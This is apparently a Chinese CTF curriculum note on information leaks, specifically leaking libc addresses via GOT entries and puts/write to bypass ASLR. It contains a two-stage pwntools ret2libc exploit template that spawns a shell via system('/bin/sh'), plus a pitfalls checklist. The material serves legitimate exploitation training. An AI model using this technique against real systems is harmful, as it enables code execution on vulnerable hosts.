---
id: core-leak-basics
title: 信息泄漏基础——GOT 泄漏与 puts/write 输出
description: 用程序自身的输出函数打印 libc/栈内地址，绕过 ASLR 的第一步
importance: 5
difficulty: 4
track: mainline
type: technique
depth: standard
prerequisites:
  - core-rop-basics
  - fnd-got-plt-fundamentals
why_learn: |
  ASLR 之后，"先泄漏再打"成为动态链接题的万能范式。这是从新手题进入真实题的分水岭。
objectives:
  - 能构造 puts(got_entry) 泄漏 libc 地址并解释为何可行
  - 能处理"泄漏后返回到 main 再打第二段"的两段式结构
  - 能用泄漏值计算 libc 基址并校验合理性
resources:
  - res-nightmare
  - res-libc-database
  - res-ctf-wiki-stack-intro
challenges:
  - ch-nightmare-csaw19-babyboi
  - ch-nightmare-utc19-shellme
hints: []
writeups: []
review:
  method: 从零写一个完整两段式 exp
  interval: 首次后 2 周
sources:
  - "Nightmare §5 ROP Dynamically Compiled (verified 2026-09-27)"
verification_status: verified
last_verified: 2026-09-27
---

# 信息泄漏基础

## 为什么能泄漏
- GOT 里存着**已解析函数的真实 libc 地址**。
- 程序里现成的输出函数（puts/printf/write）+ ROP 传参 → 把任意地址内容打出来。

## 标准两段式（背下来）
```python
# 第一段：泄漏
payload1 = flat(padding, pop_rdi, elf.got['puts'], elf.plt['puts'], elf.symbols['main'])
p.recvuntil(...); p.sendline(payload1)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']     # 基址归一

# 第二段：真打
payload2 = flat(padding, ret, pop_rdi, next(libc.search(b'/bin/sh')), libc.symbols['system'])
```

## 细节清单（错一个就翻车）
- [ ] 泄漏值收够 8 字节（不足补 \x00）
- [ ] 基址低位对齐检查（libc.address & 0xfff == 0）
- [ ] 返回点选择：回 main/vuln 重开第二轮；留一条"退路"防崩溃
- [ ] 远程 libc 与本地不同 → 用泄漏值反查（[libc-basics](libc-basics.md)）
- [ ] 栈对齐 ret 垫片

## 其他泄漏源
- 栈地址：`environ`（libc 符号）读出栈上指针 → 用于精准定位返回地址（做栈迁移/精确覆盖时）。
- PWN GUI 输出、错误信息、格式化字符串（下一个层次 → [fmt-string](../format-string/fmt-string.md)）。
